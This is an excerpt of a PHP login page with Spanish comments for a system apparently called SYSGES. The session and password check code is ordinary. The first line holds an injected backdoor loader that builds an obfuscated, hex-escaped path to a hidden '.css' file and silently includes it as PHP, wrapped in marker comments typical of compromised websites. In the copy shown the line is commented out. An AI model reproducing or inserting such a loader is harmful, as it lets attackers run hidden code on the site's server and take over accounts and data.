...
//$r1g = "/home/gesmujer/\x70ublic_html/SYSGES/includes/.82778613.css"; if (isset($r1g)){ @include_once /* b8 */ ($r1g); }

/*b5798*/
session_start();

//require_once './db/config.php'; // Ruta al archivo de configuración
...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    if ($user) {
      if (password_verify($password, $user['Password'])) {
        ...
        $_SESSION['user_id'] = $user['ID_Personal']; // Almacena el ID de usuario en la sesión
        $_SESSION['role_id'] = $user['ID_Rol']; // Almacena el ID del rol en la sesión
...
// else {
//     // Si no se envió un formulario POST, redirigir al formulario de inicio de sesión
//     header("Location: ../modals/index.html");
//     exit();
// }
?>
  ...
  <body class="d-flex align-items-center py-4 bg-body-tertiary">
    ...
    <main class="form-signin w-100 m-auto">
        <form action="index.php" method="POST">
            <img class="mb-4" src="../assets/img/logo 1.png" alt="" width="220" height="200">
